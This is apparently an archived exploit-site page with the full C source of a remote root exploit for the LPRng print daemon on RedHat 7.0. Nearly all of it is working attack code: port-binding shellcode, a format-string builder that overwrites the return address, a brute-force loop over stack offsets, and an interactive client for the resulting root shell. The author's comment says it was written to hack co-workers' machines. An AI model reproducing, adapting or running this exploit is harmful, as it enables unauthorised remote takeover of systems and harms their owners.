<html><head><title>LPRng (RedHat 7.0) lpd Remote Root Format String Exploit</title></head><pre>/*
 *  Copyright (c) 2000 - Security.is
 *
 *  The following material may be freely redistributed, provided
 *  that the code or the disclaimer have not been partly removed,
 *  altered or modified in any way. The material is the property
 *  of security.is. You are allowed to adopt the represented code
 *  in your programs, given that you give credits where it's due.
 *
 * security.is presents: LPRng/Linux remote root lpd exploit.
 * 
 * Author: DiGiT - teddi@linux.is
 * 
 * Thanks to: portal for elite formatstring talent ;&gt;
 * Greets to: security.is, #!ADM
 * 
 * Wrote it because I wanted to hack my co-workers machines ;&gt;
 *
 * Run: ./SEClpd victim brute -t type  
 * Try first ./SEClpd victim -t 0 then try the brute. 
 */

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;arpa/inet.h&gt;
#include &lt;netdb.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;arpa/inet.h&gt;

#define ADDRESS_BUFFER_SIZE   32+4
#define APPEND_BUFFER_SIZE    52
#define FORMAT_LENGTH         512-8
#define NOPCOUNT	      200
#define SHELLCODE_COUNT	      1030
#define DELAY	              50000 /* usecs */ 
#define OFFSET_LIMIT	      5000

char shellcode[] = 
  &quot;\x31\xdb\x31\xc9\x31\xc0\xb0\x46\xcd\x80&quot;
  &quot;\x89\xe5\x31\xd2\xb2\x66\x89\xd0\x31\xc9\x89\xcb\x43\x89\x5d\xf8&quot;
  &quot;\x43\x89\x5d\xf4\x4b\x89\x4d\xfc\x8d\x4d\xf4\xcd\x80\x31\xc9\x89&quot;
  &quot;\x45\xf4\x43\x66\x89\x5d\xec\x66\xc7\x45\xee\x0f\x27\x89\x4d\xf0&quot;
  &quot;\x8d\x45\xec\x89\x45\xf8\xc6\x45\xfc\x10\x89\xd0\x8d\x4d\xf4\xcd&quot;
  &quot;\x80\x89\xd0\x43\x43\xcd\x80\x89\xd0\x43\xcd\x80\x89\xc3\x31\xc9&quot;
  &quot;\xb2\x3f\x89\xd0\xcd\x80\x89\xd0\x41\xcd\x80\xeb\x18\x5e\x89\x75&quot;
  &quot;\x08\x31\xc0\x88\x46\x07\x89\x45\x0c\xb0\x0b\x89\xf3\x8d\x4d\x08&quot;
  &quot;\x8d\x55\x0c\xcd\x80\xe8\xe3\xff\xff\xff/bin/sh&quot;;

struct target
 {
  char *os_name;
  u_long eip_address;
  u_long shellcode_address;
  unsigned int position;
  int written_bytes;
  int align;
};

struct target targets[] =
 {
  { &quot;RedHat 7.0 - Guinesss    &quot;, 0xbffff3ec, 0L, 300, 70, 2,         },
  { &quot;RedHat 7.0 - Guinesss-dev&quot;, 0xbffff12c, 0L, 300, 70, 2,         },
  { NULL, 0L, 0L, 0, 0, 0 }
};

static char address_buffer[ADDRESS_BUFFER_SIZE+1];
static char append_buffer[APPEND_BUFFER_SIZE+1];
static char shellcode_buffer[1024];
static char *hostname=NULL;
static int offset;
static struct hostent *he;
int type=-1;
int brute=-1, failure=1;

void calculate_rets(u_long eip_addr, u_long shellcode_addr, u_int previous, u_int addr_loc)
{
   int i;
   unsigned int tmp = 0;
   unsigned int copied = previous;
   unsigned int num[4] =
   {
      (unsigned int) (shellcode_addr &amp; 0x000000ff),
      (unsigned int)((shellcode_addr &amp; 0x0000ff00) &gt;&gt; 8),
      (unsigned int)((shellcode_addr &amp; 0x00ff0000) &gt;&gt; 16),
      (unsigned int)((shellcode_addr &amp; 0xff000000) &gt;&gt; 24)
   };

   memset (address_buffer, '\0', sizeof(address_buffer));
   memset (append_buffer, '\0', sizeof(append_buffer));

   for (i = 0; i &lt; 4; i++)
   {
      while (copied &gt; 0x100)
         copied -= 0x100;

      if ( (i &gt; 0) &amp;&amp; (num[i-1] == num[i]) )
         sprintf (append_buffer+strlen(append_buffer), &quot;%%%d$n&quot;, addr_loc+i);
      else if (copied &lt; num[i])
      {
         if ( (num[i] - copied) &lt;= 10)
         {
            sprintf (append_buffer+strlen(append_buffer), &quot;%.*s&quot;,
               (int)(num[i] - copied), &quot;security.is!&quot;);
            copied += (num[i] - copied);
            sprintf (append_buffer+strlen(append_buffer), &quot;%%%d$n&quot;, addr_loc+i);         } else {
            sprintf (append_buffer+strlen(append_buffer), &quot;%%.%du&quot;,
               num[i] - copied);
            copied += (num[i] - copied);
            sprintf (append_buffer+strlen(append_buffer), &quot;%%%d$n&quot;, addr_loc+i);         }
      } else {
         tmp = ((num[i] + 0x100) - copied);
         sprintf (append_buffer+strlen(append_buffer), &quot;%%.%du&quot;, tmp);
         copied += ((num[i] + 0x100) - copied);
         sprintf (append_buffer+strlen(append_buffer), &quot;%%%d$n&quot;, addr_loc+i);
      }
     
      sprintf (address_buffer+strlen(address_buffer), &quot;%c%c%c%c&quot;,
         (unsigned char) ((eip_addr+i) &amp; 0x000000ff),
         (unsigned char)(((eip_addr+i) &amp; 0x0000ff00) &gt;&gt; 8),
         (unsigned char)(((eip_addr+i) &amp; 0x00ff0000) &gt;&gt; 16),
         (unsigned char)(((eip_addr+i) &amp; 0xff000000) &gt;&gt; 24));
   }

   while (strlen(address_buffer) &lt; ADDRESS_BUFFER_SIZE)
      strcat (address_buffer, &quot;X&quot;);


#ifdef DEBUG
   printf (&quot;\nGeneration complete:\nAddress: &quot;);
   for (i = 0; i &lt; strlen(address_buffer); i++)
   {
      if ( ((i % 4) == 0) &amp;&amp; (i &gt; 0) )
         printf (&quot;.&quot;);
      printf (&quot;%02x&quot;, (unsigned char)address_buffer[i]);
   }
   printf (&quot;\nAppend: %s\n&quot;, append_buffer);
#endif

   return;
}

char *create_malicious_string(void)
{
   static char format_buffer[FORMAT_LENGTH+1];
   long addr1,addr2;
   int i;

   memset (format_buffer, '\0', sizeof(format_buffer));

        targets[type].shellcode_address = targets[type].eip_address + SHELLCODE_COUNT;

	addr1 = targets[type].eip_address;
        addr2 = targets[type].shellcode_address;
  calculate_rets (addr1, addr2,targets[type].written_bytes, targets[type].position);
   
   (void)snprintf (format_buffer, sizeof(format_buffer)-1, &quot;%.*s%s&quot;,
                   targets[type].align, &quot;BBBB&quot;, address_buffer);

   strncpy (address_buffer, format_buffer, sizeof(address_buffer)-1);
   strncpy (format_buffer, append_buffer, sizeof(format_buffer)-1);
	
   for(i = 0 ; i &lt; NOPCOUNT ; i++) 
   strcat(format_buffer, &quot;\x90&quot;);

strcat(format_buffer, shellcode);

   return (format_buffer);
}

int connect_victim()
{

   int sockfd, n;
   struct sockaddr_in s;
   fd_set fd_stat;
   char buff[1024]; 

  static char testcmd[256] = &quot;/bin/uname -a ; id ;\r\n&quot;;
  
   s.sin_family = AF_INET;
   s.sin_port = htons (3879);
   s.sin_addr.s_addr = *(u_long *)he-&gt;h_addr;


   if ((sockfd = socket (AF_INET, SOCK_STREAM, 0)) &lt; 0)
     {
       printf (&quot;--- [5] Unable to create socket!\n&quot;);
       printf(&quot;Exploit failed!\n&quot;);
       return -1;
     }

   if ((connect (sockfd, (struct sockaddr *) &amp;s, sizeof (s))) &lt; 0)
     {
       return -1;
     }

     if(brute)

	printf(&quot;+++ The eip_address is 0x%x\n\n&quot;, targets[type].eip_address);
   
     printf(&quot;-   [+] shell located on %s\n&quot;, hostname);
     printf(&quot;-   [+] Enter Commands at will\n\n&quot;);

 failure = -1;

 FD_ZERO(&amp;fd_stat);
 FD_SET(sockfd, &amp;fd_stat);
 send(sockfd, testcmd, strlen(testcmd), 0);

 while(1) {

  FD_SET(sockfd,&amp;fd_stat);
  FD_SET(0,&amp;fd_stat);

  if(select(sockfd+1,&amp;fd_stat,NULL,NULL,NULL)&lt;0) break;
  if( FD_ISSET(sockfd, &amp;fd_stat) ) {
   if((n=read(sockfd,buff,sizeof(buff)))&lt;0){
     fprintf(stderr, &quot;EOF\n&quot;);
     return 2;
   }

   if(write(1,buff,n)&lt;0)break;
  }
  if ( FD_ISSET(0, &amp;fd_stat) ) {
    if((n=read(0,buff,sizeof(buff)))&lt;0){
      fprintf(stderr,&quot;EOF\n&quot;);
      return 2;
    }

    if(send(sockfd,buff,n,0)&lt;0) break;

   }
  }
}


void send_code(char *exploit_buffer)
{

   int sockfd, n;
   struct sockaddr_in s;
   fd_set fd_stat;
   char recv[1024];
   static char testcmd[256] = &quot;/bin/uname -a ; id ;\r\n&quot;;
 
   s.sin_family = AF_INET;
   s.sin_port = htons (515);
   s.sin_addr.s_addr = *(u_long *)he-&gt;h_addr;



   if ((sockfd = socket (AF_INET, SOCK_STREAM, 0)) &lt; 0)
     {
       printf (&quot;--- [5] Unable to create socket!\n&quot;);
       printf(&quot;Exploit failed!\n&quot;);
       exit(-1);
     }

   if ((connect (sockfd, (struct sockaddr *) &amp;s, sizeof (s))) &lt; 0)
     {
       printf (&quot;--- [5] Unable to connect to %s\n&quot;, hostname);
       printf(&quot;Exploit failed, %s is not running LPD!\n&quot;, hostname);
       exit(-1);
     }


	usleep(DELAY);
        
	if(write (sockfd, exploit_buffer, strlen(exploit_buffer)) &lt; 0)
          {
             printf (&quot;Couldn't write to socket %d&quot;, sockfd);
	     printf (&quot;Exploit failed\n&quot;);
             exit(2);
         }

	close(sockfd);
	connect_victim();

   }




void usage(char *program)
{

 int i=0;

   printf(&quot;SEClpd by DiGiT of ADM/security.is ! \n\n&quot;);
   printf(&quot;Usage: %s victim [\&quot;brute\&quot;] -t type [-o offset] [-a align] [-p position] [-r eip_addr] [-c shell_addr] [-w written_bytes] \n\n&quot;, program);
   printf(&quot;ie: ./SEClpd localhost -t 0 For most redhat 7.0 boxes\n&quot;);
   printf(&quot;ie: ./SEClpd localhost brute -t 0 For brute forcing all redhat 7.0 boxes\n&quot;);
   printf(&quot;Types:\n\n&quot;);

   while( targets[i].os_name != NULL)
      printf (&quot;[ Type %d:  [ %s ]\n&quot;, i++, targets[i].os_name);
}

int main(int argc, char **argv)
{
 
   char exploit_buffer[1024];
   char *format = NULL;
   int c, brutecount=0;



if(argc &lt; 3)
  {
    usage(argv[0]);
    return 1;
 }

      hostname = argv[1];

if(!strncmp(argv[2], &quot;brute&quot;, 5)) brute = 1;

   
      while(( c = getopt (argc, argv, &quot;t:r:c:a:o:p:w:k&quot;))!= EOF){

      switch (c)
        {

         case 't':
            type = atoi(optarg);
            break;
      
         case 'r':
            targets[type].eip_address = strtoul(optarg, NULL, 16);
            break;

         case 'c':
            targets[type].shellcode_address = strtoul(optarg, NULL, 16);
            break;

         case 'a':
            targets[type].align = atoi(optarg);
            break;

         case 'o':
            offset = atoi(optarg);
            break;

         case 'p':
            targets[type].position = atoi(optarg);
            break;

         case 'w':
            targets[type].written_bytes = atoi(optarg);
            break;

        default:
          usage(argv[0]);
          return 1;
        }
   }

       if(type &lt; 0) 
         {
	   printf(&quot;You must specify a type!\n&quot;);
	   printf(&quot;example: ./SEClpd victim -t 0\n&quot;);
	   return -1;
        }

   if ( (he = gethostbyname (hostname)) == NULL)
   {
     herror(&quot;gethostbyname&quot;);
     exit(1);
   }

  targets[type].shellcode_address = targets[type].eip_address + SHELLCODE_COUNT;

   
   printf(&quot;+++ Security.is remote exploit for LPRng/lpd by DiGiT\n\n&quot;);   

   printf(&quot;+++ Exploit information\n&quot;);
   printf(&quot;+++ Victim: %s\n&quot;, hostname);
   printf(&quot;+++ Type: %d - %s\n&quot;, type, targets[type].os_name);  
   printf(&quot;+++ Eip address: 0x%x\n&quot;, targets[type].eip_address); 
   printf(&quot;+++ Shellcode address: 0x%x\n&quot;, targets[type].shellcode_address); 
   printf(&quot;+++ Position: %d\n&quot;, targets[type].position);
   printf(&quot;+++ Alignment: %d\n&quot;, targets[type].align);
   printf(&quot;+++ Offset %d\n&quot;, offset);
   printf(&quot;\n&quot;);

   printf(&quot;+++ Attacking %s with our format string\n&quot;, hostname);

if( brute &gt; 0 )
 {

  printf(&quot;+++ Brute force man, relax and enjoy the ride ;&gt;\n&quot;);
   targets[type].eip_address =  0xbffffff0;

 while(failure) 
 
  {
	memset(exploit_buffer, '\0', sizeof(exploit_buffer)); 

   format = create_malicious_string();
   strcpy(exploit_buffer, address_buffer);
   strcat(exploit_buffer, format);
   strcat(exploit_buffer, &quot;\n&quot;);
   send_code(exploit_buffer);

	targets[type].eip_address = 0xbffffff0 - offset;

  offset+=4;

    if (offset &gt; OFFSET_LIMIT) {
        printf(&quot;+++ Offset limit hit, ending brute mode ;&lt;\n&quot;);
        return -1;

       }
    }
}


else

   format = create_malicious_string();
   strcpy(exploit_buffer, address_buffer);
   strcat(exploit_buffer, format);
   strcat(exploit_buffer, &quot;\n&quot;);
   send_code(exploit_buffer);

	printf(&quot;Argh exploit failed$#%! try brute force!\n&quot;); 

   return (-1);
}


// milw0rm.com [2000-12-11]</pre></html>